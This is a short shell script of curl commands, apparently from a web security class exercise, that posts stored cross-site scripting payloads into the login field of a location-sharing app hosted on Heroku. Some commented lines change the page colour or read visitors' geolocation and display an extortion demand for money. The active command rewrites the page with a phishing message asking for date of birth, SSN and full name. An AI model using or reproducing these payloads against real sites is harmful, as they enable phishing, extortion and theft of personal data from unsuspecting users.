#curl --data "login=Bob Farid <&lat=120&lng=130" https://fathomless-anchorage-58913.herokuapp.com/sendLocation
#curl --data "login=Hacker <script> document.body.style.backgroundColor = 'blue'</script>&lat=120&lng=130" https://fathomless-anchorage-58913.herokuapp.com/sendLocation
#curl --data "login=Been Meover&lat=140&lng=150"  \
#	https://fathomless-anchorage-58913.herokuapp.com/sendLocation



# attack idea -> use js to send location to my server
#curl --data "login=Hacker15</p><script> \
#	navigator.geolocation.getCurrentPosition(function(pos) { \
#        var lat2 = pos.coords.latitude; \
#        var lng2 = pos.coords.longitude;
#        alert('Youre at ['.concat(lat2).concat(', ').concat(lng2).concat(']. To remove this information from our servers, please send 500 dollars to me')) }); \
#</script><p>&lat=1&lng=1" \
#https://fathomless-anchorage-58913.herokuapp.com/sendLocation



curl --data "login=fisher1</p><script> \
document.addEventListener('DOMContentLoaded', function() { \
	document.open().write('Your account has been locked out, please email your date of birth, SSN, and full name to ima@fish.edu to reset it') \
}, false); \
</script><p>&lat=1&lng=1" \
https://fathomless-anchorage-58913.herokuapp.com/sendLocation
